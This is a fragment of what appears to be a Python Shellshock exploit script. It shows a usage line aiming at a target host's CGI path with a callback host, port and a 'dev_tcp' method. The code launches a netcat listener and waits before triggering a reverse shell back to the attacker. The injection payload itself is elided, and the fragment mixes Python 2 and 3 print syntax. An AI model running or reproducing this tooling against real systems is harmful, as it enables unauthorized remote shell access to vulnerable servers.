...
#example: python shellshock.py -t targethost -u /cgi/test -r localhost -p 4444 -s dev_tcp
...
def netcat(port):
    ...
    netcat = 'gnome-terminal -e "nc -nvlp "'
    nc_full_command = netcat+str(port_number)
    print ("Starting listener on port "+ str(port_number))
    os.system(nc_full_command)
def main(args):
	...
	print "We will attempt to connect back to %s %s" % (args.remote, args.port)
        ...
        #try to have Netcat open before program connects to target and tries to start reverse shell.
        netcat(args.port)
        # give netcat a second before trying to connect to reverse shell
        # command below will give 2 seconds before trying to connect
        time.sleep(2)
